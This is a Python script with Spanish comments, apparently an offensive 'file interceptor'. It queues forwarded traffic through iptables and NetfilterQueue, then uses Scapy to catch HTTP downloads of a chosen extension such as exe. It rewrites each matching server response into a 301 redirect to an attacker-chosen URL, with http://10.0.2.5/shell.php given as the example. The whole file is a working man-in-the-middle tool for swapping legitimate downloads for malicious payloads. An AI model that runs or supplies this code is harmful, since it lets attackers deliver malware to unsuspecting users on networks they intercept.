#!/bin/python3

from netfilterqueue import NetfilterQueue
from scapy.all import *
import argparse
from colorama import init, Fore
import os
from subprocess import call

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--interface", dest="interface", help="Interfaz a configurar. Ejemplo: ./fileInterceptor -i eth0")
parser.add_argument("-e", "--extension", dest="extension", help="Extensión a interceptar. Ejemplo: ./fileInterceptor.py -e exe")
parser.add_argument("-u", "--url", dest="url", help="URL del recurso que se cambiará por el legítimo. Ejemplo: ./fileInterceptor.py -u http://10.0.2.5/shell.php")
options = parser.parse_args()

init()

GREEN = Fore.GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
RESET = Fore.RESET


# COMPROBAR USUARIO ROOT Y FORWARDING ACTIVADO
if os.geteuid() != 0:
    print ("¡EJECUTA COMO ROOT!".center(100, "="))
    exit()
else:
    print ( f"{GREEN}[+] Comprobando forwarding...{RESET}" )
    call(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'])
    call(['sudo', 'iptables', '-A', 'FORWARD', '-i', str(options.interface), '-j', 'NFQUEUE', '--queue-num', '5'])


print ( f'{GREEN}[+] Interceptando extensiones {options.extension}{RESET}' )
ackList = []


def processPackets(packet):  # Función de llamada
    scapyPacket = IP(packet.get_payload())  # Se convierten los datos a paquetes de Scapy

    if scapyPacket.haslayer(Raw) and scapyPacket.haslayer(TCP):
        if scapyPacket[TCP].dport == 80:
            if str( options.extension ) in str(scapyPacket[Raw].load):

                # SE EXTRAE LA URL DE LA PETICIÓN DE DESCARGA

                loadText = str(scapyPacket[Raw].load)
                queryStart = "GET"
                queryEnd = str(options.extension)

                idx1 = loadText.index(queryStart)
                idx2 = loadText.index(queryEnd)

                res = ''
                for idx in range(idx1 + len(queryStart) + 1, idx2 + len(str(options.extension))):
	                res = res + loadText[idx]
                
                # Se imprime la petición

                print (f"{RED}[+] Petición de {(options.extension).upper()} (http://{scapyPacket[IP].dst}{res}) desde {scapyPacket[IP].src}{RESET}")
                ackList.append(scapyPacket[TCP].ack)  # Se guarda el ACK en una lista para identificar en la secuencia

        elif scapyPacket[TCP].sport == 80:
            if scapyPacket[TCP].seq in ackList:  # Se identifica la respuesta a la petición anterior por el número de secuencia, que será igual al ACK en la petición
                print (f"{YELLOW}[+] Reemplazando archivo...{RESET}")
                ackList.remove(scapyPacket[TCP].seq )
                scapyPacket[Raw].load = "HTTP/1.0 301 Moved Permanently\nLocation: " + str(options.url) + "\n\n"  # Se redirige la respuesta al recurso ilegítimo


                # SE ELIMINAN PARÁMETROS QUE SE AUTOGENERARÁN PARA EVITAR LA CORRUPCIÓN DE PAQUETES

                del scapyPacket[IP].len
                del scapyPacket[IP].chksum
                del scapyPacket[TCP].chksum

                packet.set_payload(bytes(scapyPacket))
    packet.accept()  # Se reenvían los paquetes encolados

queue = NetfilterQueue()
queue.bind(5, processPackets)  # Se une la cola que creamos con la de la regla en IPTables mediante el número. Como segundo parámetro se establece una función de llamada

queue.run()
